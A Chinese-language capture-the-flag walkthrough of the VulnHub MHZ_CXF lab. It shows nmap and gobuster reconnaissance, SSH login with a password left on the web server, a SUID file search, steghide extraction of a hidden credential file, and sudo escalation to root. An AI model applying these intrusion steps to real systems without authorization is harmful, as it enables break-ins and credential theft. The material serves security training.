# MHZ_CXF 主机渗透实现

-   靶机地址：https://www.vulnhub.com/entry/mhz_cxf-c1f,471/
-   下载地址：https://download.vulnhub.com/mhzcxf/mhz_c1f.ova.zip

## 信息收集

### 主机发现

```shell
# 设置目标机网段192.168.108.1
└─$ nmap -sn 192.168.108.1/24                 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-11 12:50 HKT
Nmap scan report for 192.168.108.1
Host is up (0.00085s latency).
Nmap scan report for 192.168.108.4
Host is up (0.0011s latency).
Nmap done: 256 IP addresses (2 hosts up) scanned in 3.02 seconds

```

参数讲解：

-   `-sn` 使用ping进行扫描，不进行端口扫描，减少被目标机发现的风险

### 端口扫描

```shell
# 扫描TCP开放端口
└─$ nmap -sT --min-rate 10000 -p- 192.168.108.4       
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-11 12:54 HKT
Nmap scan report for 192.168.108.4
Host is up (0.013s latency).
Not shown: 65481 filtered tcp ports (no-response), 52 filtered tcp ports (host-unreach)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

# 扫描UDP开放端口
└─$ sudo nmap -sU --min-rate 10000 -p- 192.168.108.4
[sudo] password for kali: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-11 12:58 HKT
Nmap scan report for 192.168.108.4
Host is up (0.00093s latency).
Not shown: 65529 open|filtered udp ports (no-response)
PORT      STATE  SERVICE
7596/udp  closed unknown
49777/udp closed unknown
54858/udp closed unknown
56185/udp closed unknown
56561/udp closed unknown
57241/udp closed unknown

Nmap done: 1 IP address (1 host up) scanned in 13.42 seconds
```

参数讲解：

1.   `-sT` 使用TCP扫描
2.   `--min-rate 10000` 使用10000的速率来进行扫描，相对平衡
3.   `-p-` 扫描全端口
4.   `-sU` 使用UDP扫描

### 服务扫描系统探测

```shell
# 扫描端口服务，以及系统版本
└─$ sudo nmap -sS -sC -sV -O -p22,80 192.168.108.4
[sudo] password for kali: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-11 12:57 HKT
Nmap scan report for 192.168.108.4
Host is up (0.00078s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 38d93f98159acc3e7a448df94d78fe2c (RSA)
|   256 894e387778a4c36ddc39c400f8a567ed (ECDSA)
|_  256 7c15b918fc5c75aa3096154608a983fb (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X
OS CPE: cpe:/o:linux:linux_kernel:3.2
OS details: Linux 3.2
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.22 seconds

```

参数讲解：

1.   `-sS` 使用TCP的SYN扫描
2.   `-sV` 探测当前的服务版本
3.   `-sC` 调用默认的脚本进行漏洞探测
4.   `-p `  指定端口进行扫描

### 漏洞探测

```shell
# 调用默认脚本进行服务漏洞探测
└─$ sudo sudo nmap --script=vuln -p22,80 192.168.108.4 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-11 13:02 HKT
Pre-scan script results:
| broadcast-avahi-dos: 
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for 192.168.108.4
Host is up (0.00059s latency).

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.

Nmap done: 1 IP address (1 host up) scanned in 55.79 seconds

```

参数讲解：
	`--script-vuln`是Nmap调用的一个漏洞扫描脚本集合，用于检测已知漏洞。以下是其中一些脚本的简要介绍：

1. `http-vuln-*`：用于检测Web应用程序中已知的漏洞，包括SQL注入、文件包含、远程命令执行等。

2. `ssl-*`：用于检测SSL和TLS协议中的漏洞，包括心脏滴血漏洞、POODLE漏洞、BEAST漏洞等。

3. `smb-vuln-*`：用于检测Windows SMB协议中的漏洞，包括EternalBlue漏洞、MS17-010漏洞等。

4. `smtp-vuln-*`：用于检测SMTP协议中的漏洞，包括OpenSMTPD漏洞、Exim漏洞等。

5. `dns-*`：用于检测DNS协议中的漏洞，包括DNS隧道、DNS缓存投毒等。

6. `ssh-*`：用于检测SSH协议中的漏洞，包括SSH漏洞、SSH弱口令等。

7. `ftp-*`：用于检测FTP协议中的漏洞，包括ProFTPD漏洞、VSFTPD漏洞等。

这些脚本的使用方法类似于普通的Nmap扫描，只需在命令中加入`--script vuln`参数即可调用。例如：

nmap -sV --script vuln <target>

这将对目标进行端口扫描，并调用`--script=vuln`中的所有漏洞扫描脚本进行检测。需要注意的是，漏洞扫描脚本可能会产生误报或漏报，因此在实际应用中应该结合其他漏洞扫描工具和手动渗透测试进行综合评估。

### web扫描---目录扫描

-   80端口主界面只有一个`apache`的默认页，之前在端口扫描时发现的服务一致。
-   尝试访问常用的页面后缀发现都是404，例如：`admin.php login.php`

![image-20230511131723187](https://raw.githubusercontent.com/r0o983/images/main/image-20230511131723187.png)

#### 目录爆破

```shell
└─$ sudo gobuster dir -u http://192.168.108.4 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt 
[sudo] password for kali: 
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.108.4
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/05/11 13:21:11 Starting gobuster in directory enumeration mode
===============================================================
/server-status        (Status: 403) [Size: 278]
Progress: 219320 / 220561 (99.44%)
===============================================================
2023/05/11 13:22:08 Finished
===============================================================
```

参数讲解：

1.   `dir` 指定是以查找文件(文件夹)的形式进行扫描
2.   `-u`  指定需要扫描的目标
3.   `-w`  指定需要使用的字典文件进行目录扫描

#### 特定文件查找

```shell
└─$ sudo gobuster dir -u http://192.168.108.4 -x txt,jsp,html,asp,php -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.108.4
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              html,asp,php,txt,jsp
[+] Timeout:                 10s
===============================================================
2023/05/11 13:24:46 Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 278]
/index.html           (Status: 200) [Size: 10918]
/notes.txt            (Status: 200) [Size: 86]
/.html                (Status: 403) [Size: 278]
/server-status        (Status: 403) [Size: 278]
Progress: 1321839 / 1323366 (99.88%)
===============================================================
2023/05/11 13:30:22 Finished
===============================================================
```

参数讲解：

1.   `-x` 指定需要发现的文件类型(txt,jsp,html,asp,php)

#### web文件发现

-   此处提示他需要删除两个文件，一个文件名为`remb.txt`，以及另外一个文件名为：`remb2.txt`

![image-20230511140100147](https://raw.githubusercontent.com/r0o983/images/main/image-20230511140100147.png)

-   读取:remb.txt文件内容（first_stage:flagitifyoucan1234）

![image-20230511140302054](https://raw.githubusercontent.com/r0o983/images/main/image-20230511140302054.png)

-   尝试读取:`remb2.txt`文件内容

![image-20230511140409658](https://raw.githubusercontent.com/r0o983/images/main/image-20230511140409658.png)

## 获得初始shell

-   尝试通过在:remb.txt中获取的字符串来进行登陆shell

```shell
└─$ ssh first_stage@192.168.108.4
first_stage@192.168.108.4's password: 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-96-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon May  8 19:03:47 UTC 2023

  System load:  0.0               Processes:             91
  Usage of /:   41.3% of 9.78GB   Users logged in:       0
  Memory usage: 54%               IP address for enp0s3: 192.168.108.4
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

23 packages can be updated.
0 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Mon May  8 18:58:50 2023 from 192.168.108.1
$ 

# 提升shell交互性
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
first_stage@mhz_c1f:~$ 

# 获得初始flag
first_stage@mhz_c1f:~$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: enp0s3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:d9:6b:6d brd ff:ff:ff:ff:ff:ff
    inet 192.168.108.4/24 brd 192.168.108.255 scope global dynamic enp0s3
       valid_lft 80871sec preferred_lft 80871sec
    inet6 fe80::a00:27ff:fed9:6b6d/64 scope link 
       valid_lft forever preferred_lft forever
first_stage@mhz_c1f:~$ ls -lhia
total 860K
531710 drwxr-xr-x 6 first_stage first_stage 4.0K May  8 19:01 .
524290 drwxr-xr-x 4 root        root        4.0K Apr 24  2020 ..
534535 -rw------- 1 first_stage first_stage  951 May  8 19:03 .bash_history
531712 -rw-r--r-- 1 first_stage first_stage  220 Apr  4  2018 .bash_logout
531713 -rw-r--r-- 1 first_stage first_stage 3.7K Apr  4  2018 .bashrc
534520 drwx------ 2 first_stage first_stage 4.0K Apr 24  2020 .cache
534526 drwxr-x--- 3 first_stage first_stage 4.0K May  8 06:53 .config
534515 drwx------ 3 first_stage first_stage 4.0K May  8 06:53 .gnupg
531711 -rw-r--r-- 1 first_stage first_stage  807 Apr  4  2018 .profile
534536 -rw------- 1 first_stage first_stage    7 May  8 19:01 .python_history
534522 drwx------ 2 first_stage first_stage 4.0K Apr 24  2020 .ssh
534523 -rw------- 1 first_stage first_stage    0 Apr 24  2020 .viminfo
534524 -rwxr-xr-x 1 first_stage first_stage 811K May  8 06:48 linpeas.sh
534525 -rw-rw-r-- 1 first_stage first_stage  130 Apr 24  2020 user.txt
first_stage@mhz_c1f:~$ cat user.txt 
HEEEEEY , you did it 
that's amazing , good job man

so just keep it up and get the root bcz i hate low privileges ;)

#mhz_cyber
first_stage@mhz_c1f:~$ 


# 查找刚才notes文件中提到的remb2.txt文件。 
/dev/null e@mhz_c1f:/home/mhz_c1f/Paintings$ find / -name 'remb2.txt' -type f 2>/

```

### 查找当前可能被利用的提权文件

```shell
first_stage@mhz_c1f:/home/mhz_c1f/Paintings$ find / -perm -u=s -type f 2>/dev/null
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/openssh/ssh-keysign
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/gpasswd
/usr/bin/newuidmap
/usr/bin/newgidmap
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/at
/usr/bin/newgrp
/usr/bin/traceroute6.iputils
/usr/bin/pkexec
/usr/bin/chsh
/usr/bin/passwd
/bin/umount
/bin/fusermount
/bin/mount
/bin/ping
/bin/su
/snap/core/8268/bin/mount
/snap/core/8268/bin/ping
/snap/core/8268/bin/ping6
/snap/core/8268/bin/su
/snap/core/8268/bin/umount
/snap/core/8268/usr/bin/chfn
/snap/core/8268/usr/bin/chsh
/snap/core/8268/usr/bin/gpasswd
/snap/core/8268/usr/bin/newgrp
/snap/core/8268/usr/bin/passwd
/snap/core/8268/usr/bin/sudo
/snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/8268/usr/lib/openssh/ssh-keysign
/snap/core/8268/usr/lib/snapd/snap-confine
/snap/core/8268/usr/sbin/pppd
first_stage@mhz_c1f:/home/mhz_c1f/Paintings$ 
```

命令详解：

- `find`: 命令本身，用于查找文件和目录。

- `/`: 查找的起始目录，这里是根目录。

- `-perm`: 权限匹配选项。

- `-u=s`: 匹配用户（owner）权限中的 SUID 标志。

- `-type f`: 查找类型为文件的对象。

- `2>/dev/null`: 将标准错误输出重定向到 `/dev/null`，即不输出任何错误信息。

综合起来，这个命令会在系统中从根目录开始查找所有文件，然后匹配文件的 owner 权限中是否包含 SUID 标志，并且查找的对象必须是文件。最后，将错误输出重定向到 `/dev/null`，即丢弃错误信息。这样就可以快速找到拥有 SUID 权限的文件，通常这些文件可能存在安全风险。

:red_circle: 由于并没有找到合适的提权文件，所以这里暂时放弃。继续寻找其他文件进行尝试

### 使用scp将找到的文件进行下载

>   └─$ scp first_stage@192.168.108.4:/home/mhz_c1f/Paintings/* ./

![image-20230511151941833](https://raw.githubusercontent.com/r0o983/images/main/image-20230511151941833.png)

### 文件信息读取及查看

#### 使用`strings`依次查看文件内容并未发现有效信息

>   strings 19th\ century\ American.jpeg 

#### 使用`exiftool`依次查看文件的标头信息

>   └─$ exiftool 19th\ century\ American.jpeg 

<img src="https://raw.githubusercontent.com/r0o983/images/main/image-20230511152605105.png" alt="image-20230511152605105" style="zoom:50%;" />

#### 使用`steghide`工具来查看是否有隐写文件

-   依次查看文件

>   └─$ steghide info spinning\ the\ wool.jpeg  # 终于找到了remb2.txt文件

![image-20230511154218969](https://raw.githubusercontent.com/r0o983/images/main/image-20230511154218969.png)

Tips：此处需要填写密码，通过尝试`first_stage`的密码发现**`不正确`**，后尝试空密码即可完成读取文件操作。

-   解压找到的绑定文件

>   └─$ steghide extract -sf spinning\ the\ wool.jpeg
>   Enter passphrase: 
>   wrote extracted data to "remb2.txt".

-   读取文件内容 

>   └─$ cat remb2.txt      
>   ooh , i know should delete this , but i cant' remember it 
>   screw me 
>
>   mhz_c1f:1@ec1f

-   尝试使用得到的文件内容进行登陆，发现始终登陆不成功，之后使用第一次获得的账号进行登陆后进行切换后查看`/etc/ssh/sshd_conf`文件发现除了`first_stage`允许登陆外，其余账号皆为禁止登陆

![image-20230511160207777](https://raw.githubusercontent.com/r0o983/images/main/image-20230511160207777.png)

-   使用mhz_c1f用户进行登陆，发现已经是`root`权限用户了，直接`sudo`切换到`root`
-   成功获得`root`权限

![image-20230511160031977](https://raw.githubusercontent.com/r0o983/images/main/image-20230511160031977.png)

-   获得`root`目录下的`flag`

![image-20230511160315069](https://raw.githubusercontent.com/r0o983/images/main/image-20230511160315069.png)